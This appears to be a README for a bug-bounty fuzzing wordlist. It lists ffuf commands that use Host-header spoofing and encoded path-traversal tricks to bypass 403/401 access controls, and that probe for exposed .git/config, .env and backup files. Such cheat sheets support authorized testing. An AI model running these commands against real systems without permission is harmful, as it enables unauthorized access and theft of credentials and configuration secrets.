# bbFuzzing.txt

- bbFuzzing.txt - a unique vocabulary that is 90% generated with OpenAI ChatGPT.

Tools for 403/401 bypass
1. [bypassfuzzer](https://github.com/intrudir/BypassFuzzer) by @intrudir
2. [bypass-url-parser](https://github.com/laluka/bypass-url-parser) by @TheLaluka
3. [dontgo403](https://github.com/devploit/dontgo403) by @devploit

```
> ffuf -u target.com/FUZZ -w bbFuzzing.txt
> ffuf -u target.com/FUZZ -H "Host: 127.0.0.1" -w bbFuzzing.txt
> ffuf -u target.com/FUZZ -H "Host: localhost" -w bbFuzzing.txt

> ffuf -u target.com/FUZZ/ -w bbFuzzing.txt
> ffuf -u target.com/%3B/FUZZ/ -w bbFuzzing.txt
> ffuf -u target.com/%2e/FUZZ/ -w bbFuzzing.txt

> ffuf -u target.com/.FUZZ -w bbFuzzing.txt
> ffuf -u target.com/%u002e%u002e/%u002e%u002e/FUZZ -w bbFuzzing.txt
> ffuf -u target.com/..%3B/FUZZ/ -w bbFuzzing.txt

> ffuf -u target.com/%2e%2e%2f/FUZZ/ -w bbFuzzing.txt
> ffuf -u target.com/%2eFUZZ -w bbFuzzing.txt
> ffuf -u target.com/%2e/FUZZ/ -w bbFuzzing.txt

> ffuf -u target.com/_FUZZ -w bbFuzzing.tx
> ffuf -u target.com/FUZZ_ -w bbFuzzing.txt
> ffuf -u target.com/_FUZZ_ -w bbFuzzing.txt

> ffuf -u target.com/..;/FUZZ/ -w bbFuzzing.txt
> ffuf -u target.com/..;/..;/FUZZ/ -w bbFuzzing.txt
> ffuf -u target.com/../FUZZ -w bbFuzzing.txt
> ffuf -u target.com/FUZZ..;/ -w bbFuzzing.txt

> ffuf -u target.com/FUZZ;/ -w bbFuzzing.txt
> ffuf -u target.com/FUZZ# -w bbFuzzing.txt
> ffuf -u target.com/FUZZ/~ -w bbFuzzing.txt

> ffuf -u target.com/!FUZZ -w bbFuzzing.txt
> ffuf -u target.com/#/FUZZ/ -w bbFuzzing.txt
> ffuf -u target.com/-/FUZZ/ -w bbFuzzing.txt

> ffuf -u target.com/FUZZ.bkp -w bbFuzzing.txt
> ffuf -u target.com/FUZZ%20 -w bbFuzzing.txt
> ffuf -u target.com/FUZZ.<extension> -w bbFuzzing.txt

> ffuf -u target.com/FUZZ~ -w bbFuzzing.txt
> ffuf -u target.com/FUZZ/.git/config -w bbFuzzing.txt
> ffuf -u target.com/FUZZ/.env -w bbFuzzing.txt

> ffuf -u target.com/FUZZ. -w bbFuzzing.txt
> ffuf -u target.com/FUZZ/* -w bbFuzzing.txt
> ffuf -u target.com/FUZZ/? -w bbFuzzing.txt

> ffuf -u target.com/FUZZ -recursive -w fuzzing.txt
> ffuf -u target.com/FUZZ -recursive -w fuzzing.txt -e .asp,.aspx,.ashx,.ash,.jsp,.jspx,.php,.js,.dll,.json,.bak,.bkp,.conf,.txt,.py,.zip,.tar.gz,.tar,.7z
> ffuf -u target.com/FUZZ?.css -w fuzzing.txt
```
